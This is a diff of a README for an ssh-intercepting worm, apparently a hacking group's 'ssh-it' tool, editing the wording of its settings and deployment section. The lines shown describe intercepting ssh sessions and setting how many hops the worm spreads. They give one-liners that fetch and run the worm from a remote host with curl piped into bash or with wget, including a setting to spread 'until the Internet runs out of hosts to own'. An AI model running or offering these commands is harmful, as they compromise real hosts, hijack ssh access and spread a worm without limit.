@@ -34,8 +34,8 @@ This is ALPHA STAGE. DO NOT SHARE.
 If you know about this then consider yourself special. Join us on [Telegram](https://t.me/thcorg).
 
 ALPHA DEFAULT SETTINGS:
-* ```THC_VERBOSE=1``` You will see a warning when *ssh* is being intercepted.
-* ```THC_DEPTH=2``` The worm will stop spreading 2 hops from the host where it got deployed.
+* ```THC_VERBOSE=1``` Display a warning when *ssh* is intercepted (in bold red).
+* ```THC_DEPTH=2``` The worm will not spread further than 2 hops away from the current host.
 
 {:refdef: style="text-align: center;"}
 ![Verbose-Example](verbose-example.png)
@@ -50,8 +50,9 @@ Or go bonkers and let the worm run until the Internet runs out of hosts to own:
 ```shell
 THC_DEPTH=9999 THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
+### Tips & Tricks
 
-Deploy from a self-extracting [ssh-it-deploy.sh](http://nossl.segfault.net/ssh-it-deploy.sh):
+Deploy from a self-extracting shell-script [ssh-it-deploy.sh](http://nossl.segfault.net/ssh-it-deploy.sh):
 ```shell
 # Without HTTPS 
 wget --no-hsts http://nossl.segfault.net/ssh-it-deploy.sh && \
